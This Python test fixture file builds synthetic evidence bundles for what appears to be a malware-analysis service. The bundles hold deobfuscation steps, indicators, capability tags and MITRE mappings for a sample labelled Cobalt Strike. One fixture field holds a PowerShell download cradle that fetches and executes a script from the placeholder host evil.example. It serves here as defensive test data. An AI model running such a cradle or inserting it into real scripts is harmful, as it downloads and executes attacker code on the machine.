"""Shared fixtures for L2 service tests."""
from __future__ import annotations

from l2_investigation.schemas import (
    CapabilityEvidence,
    EvidenceBundle,
    IocEvidence,
    MitreEvidence,
    SampleMetadata,
    TransformationEvidence,
)


def synthetic_certificate() -> dict:
    return {
        "iterations_executed": 4,
        "structural_changes": 1,
        "content_changes": 1,
        "decoder_changes": 1,
        "semantic_changes": 1,
        "canonical_state": True,
        "remaining_deterministic_ops": 0,
        "residual_obfuscation": "NONE",
        "final_artifact_hash_sha256": "f" * 64,
        "initial_artifact_hash_sha256": "0" * 64,
        "max_depth_reached": False,
        "terminated_reason": "canonical_state",
        "ready_for_behavioral_analysis": True,
        "interpreter": "powershell",
        "engine_version": "M1-1.0.0",
    }


def synthetic_bundle(case_id: str = "case-0001") -> EvidenceBundle:
    return EvidenceBundle(
        case_id=case_id,
        certificate=synthetic_certificate(),
        canonical_output='powershell.exe -c "iex (New-Object Net.WebClient).DownloadString(\'http://evil.example/a.ps1\')"',
        transformations=(
            TransformationEvidence(iteration=0, pass_name="structural", transformation="unwrap_powershell_command", changed=True, before_hash="a"*64, after_hash="b"*64),
            TransformationEvidence(iteration=1, pass_name="content", transformation="normalize_whitespace", changed=True, before_hash="b"*64, after_hash="c"*64),
            TransformationEvidence(iteration=2, pass_name="decoder", transformation="base64_decode", changed=True, before_hash="c"*64, after_hash="d"*64),
            TransformationEvidence(iteration=3, pass_name="semantic", transformation="reveal_download_cradle", changed=True, before_hash="d"*64, after_hash="e"*64),
        ),
        iocs=(
            IocEvidence(ioc_id="ioc-001", ioc_type="url", value="http://evil.example/a.ps1", source_iteration=3, source_span=(37, 65), context="DownloadString"),
            IocEvidence(ioc_id="ioc-002", ioc_type="domain", value="evil.example", source_iteration=3, source_span=(44, 56)),
        ),
        capabilities=(
            CapabilityEvidence(capability_id="EXEC.POWERSHELL", display_name="PowerShell Execution", confidence="high", source_iterations=(0,)),
            CapabilityEvidence(capability_id="NETWORK.DOWNLOAD", display_name="Network Download", confidence="high", source_iterations=(3,)),
        ),
        mitre=(
            MitreEvidence(technique_id="T1059.001", technique_name="PowerShell", tactic="execution", via_capability="EXEC.POWERSHELL", source_iterations=(0,)),
            MitreEvidence(technique_id="T1105", technique_name="Ingress Tool Transfer", tactic="command-and-control", via_capability="NETWORK.DOWNLOAD", source_iterations=(3,)),
        ),
        sample=SampleMetadata(family="cobalt_strike", technique="download_cradle", variant="ps_download_string", sample_id="CS-2026-08-04-0001"),
    )


def empty_bundle(case_id: str = "case-empty") -> EvidenceBundle:
    return EvidenceBundle(case_id=case_id, certificate=synthetic_certificate(), canonical_output="")
